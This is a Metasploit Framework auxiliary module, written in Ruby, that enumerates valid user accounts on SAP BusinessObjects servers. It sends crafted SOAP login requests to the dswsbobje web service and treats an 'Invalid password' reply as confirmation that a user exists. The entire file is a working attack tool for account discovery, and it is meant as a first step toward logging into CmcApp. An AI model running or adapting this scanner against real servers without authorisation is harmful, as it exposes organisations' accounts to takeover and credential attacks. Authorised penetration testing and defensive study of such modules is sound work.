##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'		   => 'SAP BusinessObjects User Enumeration',
			'Description'	=> %Q{
				This module simply attempts to enumerate SAP BusinessObjects
				users.The dswsbobje interface is only used to verify valid
				users for CmcApp. Therefore, any valid users that have been
				identified can be leveraged by logging into CmcApp.
				},
			'References'  =>
				[
					# General
					[ 'URL', 'http://spl0it.org/files/talks/source_barcelona10/Hacking%20SAP%20BusinessObjects.pdf' ]
				],
			'Author'		 => [ 'Joshua Abraham <jabra[at]rapid7.com>' ],
			'License'		=> MSF_LICENSE
		)

		register_options(
			[
				Opt::RPORT(8080),
				OptString.new('URI', [false, 'Path to the SAP BusinessObjects Axis2', '/dswsbobje']),
			], self.class)
		register_autofilter_ports([ 8080 ])
	end

	def run_host(ip)
		res = send_request_cgi({
			'uri'    => normalize_uri(datastore['URI'], "/services/listServices"),
			'method' => 'GET'
		}, 25)
		return if not res

		each_user_pass { |user, pass|
			enum_user(user)
		}
	end

	def enum_user(user='administrator', pass='invalid-sap-password-0d03b389-b7a1-4ecc-8898-e62d1836b72a')
		vprint_status("#{rhost}:#{rport} - Enumerating username:'#{user}'")
		success = false
		soapenv='http://schemas.xmlsoap.org/soap/envelope/'
		xmlns='http://session.dsws.businessobjects.com/2007/06/01'
		xsi='http://www.w3.org/2001/XMLSchema-instance'

		data = '<?xml version="1.0" encoding="utf-8"?>' + "\r\n"
		data << '<soapenv:Envelope xmlns:soapenv="' +  soapenv + '" xmlns:ns="' + xmlns + '">' + "\r\n"
		data << '<soapenv:Body>' + "\r\n"
		data << '<login xmlns="' + xmlns + '">' + "\r\n"
		data << '<credential xmlns="' + xmlns + '" xmlns:ns="' + xmlns + '" xmlns:xsi="' + xsi + '" Login="' + user  + '" Password="' + pass + '" xsi:type="ns:EnterpriseCredential" />' + "\r\n"
		data << '</login>' + "\r\n"
		data << '</soapenv:Body>' + "\r\n"
		data << '</soapenv:Envelope>' + "\r\n\r\n"

		begin
			res = send_request_raw({
				'uri'     => normalize_uri(datastore['URI']) + "/services/Session",
				'method'  => 'POST',
				'data'    => data,
				'headers' =>
					{
						'Content-Length' => data.length,
						'SOAPAction'	=> '"' + 'http://session.dsws.businessobjects.com/2007/06/01/login' + '"',
						'Content-Type'  => 'text/xml; charset=UTF-8',
					}
			}, 45)

			if res
				return :abort if (!res or (res and res.code == 404))
				success = true if(res and res.body.match(/Invalid password/i))
				success
			else
				vprint_error("[SAP BusinessObjects] No response")
				return :abort
			end

		rescue ::Rex::ConnectionError
			vprint_error("[SAP BusinessObjects] Unable to attempt authentication")
			return :abort
		end

		if success
			print_good("[SAP BusinessObjects] Found valid username : '#{user}'")
			return :next_user
		else
			return
		end
	end
end
